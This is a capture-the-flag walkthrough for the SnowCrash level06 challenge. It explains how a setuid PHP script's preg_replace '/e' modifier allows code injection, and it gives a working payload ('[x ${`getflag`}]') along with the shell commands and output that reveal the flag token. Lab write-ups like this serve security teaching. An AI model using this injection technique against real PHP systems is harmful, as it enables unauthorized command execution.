@@ -1,0 +1,44 @@
+We run "ls -l" Command in our home directory.
+
+level06@SnowCrash:~$ ls -l
+total 12
+-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
+-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
+
+So we find a binary and a .php.
+
+We start by checking the .php:
+
+level06@SnowCrash:~$ cat level06.php
+#!/usr/bin/php
+<?php
+function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
+function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
+$r = x($argv[1], $argv[2]); print $r;
+?>
+
+We see that this code take 2 arguments and pass them to the function x, but only use the 1st one, so we only need to work with one argument.
+
+Then we see that is calls file_get_content(), this function takes and read the content of a file and stock it into a variable. (https://www.php.net/manual/en/function.file-get-contents.php)
+
+So our argument needs to be a file containing something.
+
+Then it calls the function preg_replace() which take a pattern and replace it with something. (https://www.php.net/manual/en/function.preg-replace).
+
+We can see that preg_replace as pattern take a regex that should look like [x (something].
+
+We can also notice that is uses a modifier "/e" that evaluate php code in preg_replace, which is our exploit point. (http://www.madirish.net/402)
+
+So all we have do is do an os injection by variable variable while also using the same pattern the regex ask for. (https://www.dummies.com/programming/php/how-to-use-php-variable-variables/)
+
+So our exploit should look like this:
+
+level06@SnowCrash:~$ vi /tmp/exploit
+
+[x ${`getflag`}]
+
+Then we just execute the binary with the exploit as our argument
+
+level06@SnowCrash:~$ ./level06 /tmp/exploit
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+ in /home/user/level06/level06.php(4) : regexp code on line 1
